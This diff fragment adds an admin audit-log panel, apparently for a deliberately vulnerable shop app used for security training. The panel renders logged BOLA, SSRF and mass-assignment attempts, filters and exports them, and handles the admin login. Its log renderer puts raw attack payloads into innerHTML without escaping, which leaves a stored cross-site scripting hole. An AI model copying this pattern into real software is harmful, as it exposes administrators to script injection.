+                        document.getElementById('logsTable').innerHTML = '<tr><td colspan="7" style="color:#ff0000; text-align:center;">❌ Not logged in - Please login as admin</td></tr>';
+                    } else {
+                        throw new Error('HTTP ' + response.status);
+                    }
+                    return;
+                }
+                
+                const data = await response.json();
+                allLogs = data.logs || [];
+                renderLogs(allLogs);
+            } catch (e) {
+                console.error('Error loading logs:', e);
+                document.getElementById('logsTable').innerHTML = `<tr><td colspan="7" style="color:#ff0000; text-align:center;">❌ Error: ${e.message}</td></tr>`;
+            }
+        }
+
+        function renderLogs(logs) {
+            if (!logs || logs.length === 0) {
+                document.getElementById('logsTable').innerHTML = '<tr><td colspan="7" style="text-align:center; color:#888;">No logs available</td></tr>';
+                return;
+            }
+            
+            let logsHTML = logs.map(log => {
+                const ts = new Date(log.timestamp * 1000).toLocaleString();
+                const eventColor = log.event_type.includes('BOLA') ? '#ff3333' : 
+                                   log.event_type.includes('SSRF') ? '#ffaa00' :
+                                   log.event_type.includes('MASS') ? '#ff6600' : '#00ff00';
+                const payload = log.payload ? log.payload.substring(0, 50) + (log.payload.length > 50 ? '...' : '') : log.note || '-';
+                return `
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                        <td>${ts}</td>
+                        <td style="color:${eventColor}; font-weight:700;">${log.event_type}</td>
+                        <td>${log.user_id || 'N/A'}</td>
+                        <td style="color:#00ffff;">${log.endpoint}</td>
+                        <td style="font-size:0.8em;">${log.ip || 'unknown'}</td>
+                        <td style="font-size:0.8em; max-width:300px; word-break:break-all;">${payload}</td>
+                        <td style="color:#ffcc00;">⚠ LOGGED</td>
+                    </tr>
+                `;
+            }).join('');
+            
+            document.getElementById('logsTable').innerHTML = logsHTML;
+        }
+
+        function clearLogFilter() {
+            document.getElementById('logFilter').value = '';
+            renderLogs(allLogs);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            loadData();
+            loadLogs();
+            setInterval(loadData, 5000);
+            setInterval(loadLogs, 10000);
+        });
+
+        // Filter logs on input
+        document.addEventListener('DOMContentLoaded', function() {
+            const logFilter = document.getElementById('logFilter');
+            if (logFilter) {
+                logFilter.addEventListener('keyup', function() {
+                    const query = this.value.toLowerCase();
+                    const filtered = allLogs.filter(log => 
+                        log.event_type.toLowerCase().includes(query) || 
+                        log.endpoint.toLowerCase().includes(query)
+                    );
+                    renderLogs(filtered);
+                });
+            }
+        });
+
+        function exportLogs() {
+            if (allLogs.length === 0) {
+                alert('No logs to export');
+                return;
+            }
+            
+            const headers = ['Timestamp', 'Event Type', 'User ID', 'Endpoint', 'IP', 'Payload/Note'];
+            const rows = allLogs.map(log => [
+                new Date(log.timestamp * 1000).toLocaleString(),
+                log.event_type,
+                log.user_id || 'N/A',
+                log.endpoint,
+                log.ip || 'unknown',
+                log.payload || log.note || ''
+            ]);
+            
+            let csv = headers.join(',') + '\n';
+            csv += rows.map(row => row.map(cell => '"' + String(cell).replace(/"/g, '""') + '"').join(',')).join('\n');
+            
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            const url = URL.createObjectURL(blob);
+            link.setAttribute('href', url);
+            link.setAttribute('download', `vulnshop-audit-logs-${new Date().toISOString().split('T')[0]}.csv`);
+            link.style.visibility = 'hidden';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Admin login for logs
+        async function adminLogin() {
+            const email = document.getElementById('adminEmail').value.trim();
+            const password = document.getElementById('adminPassword').value.trim();
+            const statusEl = document.getElementById('adminLoginStatus');
+            
+            if (!email || !password) {
+                statusEl.textContent = '⚠️ Enter email and password';
+                statusEl.style.color = '#ffaa00';
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/auth/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                if (!response.ok) throw new Error('Login failed');
+                
+                const data = await response.json();
+                const token = data.access_token;
+                const user = data.user;
+                
+                if (user.is_admin) {
+                    localStorage.setItem('adminToken', token);
+                    statusEl.textContent = `✓ Logged in as ${user.email} (Admin)`;
+                    statusEl.style.color = '#00ff00';
+                    // Auto-load logs
+                    await loadLogs();
+                } else {
+                    statusEl.textContent = '✗ Not an admin account';
+                    statusEl.style.color = '#ff0000';
+                }
+            } catch (e) {
+                statusEl.textContent = `✗ ${e.message}`;
+                statusEl.style.color = '#ff0000';
+            }
+        }
+    </script>
+</body>
+</html>
